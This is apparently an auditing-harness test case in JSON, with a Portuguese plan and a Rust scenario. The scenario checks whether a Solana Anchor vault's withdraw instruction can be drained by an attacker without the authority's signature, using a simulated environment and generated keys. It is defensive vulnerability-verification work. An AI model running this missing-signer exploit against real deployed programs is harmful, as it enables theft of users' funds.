{
  "plan": "Inicializa o vault com a autoridade legítima e deposita lamports para que o vault tenha saldo. O baseline chama withdraw com a autoridade assinando, provando que o cenário está correto. O ataque chama withdraw com a mesma autoridade, mas sem assinatura, e um recipient controlado pelo atacante. O efeito mede se os lamports do vault diminuíram e os do recipient aumentaram sem a assinatura da autoridade.",
  "scenario": "let authority = Pubkey::new_unique();
let attacker = Pubkey::new_unique();
let (vault_pda, _bump) = Pubkey::find_program_address(&[b"vault", authority.as_ref()], &env.program_id);

// Contas iniciais
let authority_account = wallet(1_000_000_000);
let attacker_account = wallet(1_000_000_000);
let vault_account = empty_account();
let system_program = system_program_account();

// Inicializa o vault
let init_ix = env.anchor_ix(
    "initialize",
    &(),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program.0, false),
    ],
);
let init_accounts = vec![
    (vault_pda, vault_account.clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let init_result = env.baseline("initialize vault", &init_ix, &init_accounts);

// Deposita lamports no vault
let deposit_amount = 500_000_000u64;
let deposit_ix = env.anchor_ix(
    "deposit",
    &(&deposit_amount),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program.0, false),
    ],
);
let deposit_accounts = vec![
    (vault_pda, after(&init_result, &vault_pda).clone()),
    (authority, authority_account.clone()),
    system_program.clone(),
];
let deposit_result = env.baseline("deposit into vault", &deposit_ix, &deposit_accounts);

// Baseline: withdraw legítimo com autoridade assinando
let withdraw_amount = 100_000_000u64;
let withdraw_ix = env.anchor_ix(
    "withdraw",
    &(&withdraw_amount),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, true),
        AccountMeta::new(attacker, false),
    ],
);
let withdraw_accounts = vec![
    (vault_pda, after(&deposit_result, &vault_pda).clone()),
    (authority, authority_account.clone()),
    (attacker, attacker_account.clone()),
];
let baseline_result = env.baseline("legitimate withdraw with authority signature", &withdraw_ix, &withdraw_accounts);

// Ataque: withdraw sem assinatura da autoridade
let attack_ix = env.anchor_ix(
    "withdraw",
    &(&withdraw_amount),
    vec![
        AccountMeta::new(vault_pda, false),
        AccountMeta::new_readonly(authority, false), // sem assinatura
        AccountMeta::new(attacker, false),
    ],
);
let attack_accounts = vec![
    (vault_pda, after(&baseline_result, &vault_pda).clone()),
    (authority, authority_account.clone()),
    (attacker, attacker_account.clone()),
];
let attack_result = env.attack("withdraw without authority signature", &attack_ix, &attack_accounts);

if attack_result.program_result == ProgramResult::Success {
    let vault_after = after(&attack_result, &vault_pda);
    let attacker_after = after(&attack_result, &attacker);
    let vault_lamports_before = after(&baseline_result, &vault_pda).lamports();
    let attacker_lamports_before = after(&baseline_result, &attacker).lamports();
    env.effect(
        "vault lamports decreased without authority signature",
        vault_after.lamports() == vault_lamports_before - withdraw_amount,
    );
    env.effect(
        "attacker lamports increased without authority signature",
        attacker_after.lamports() == attacker_lamports_before + withdraw_amount,
    );
}"
}

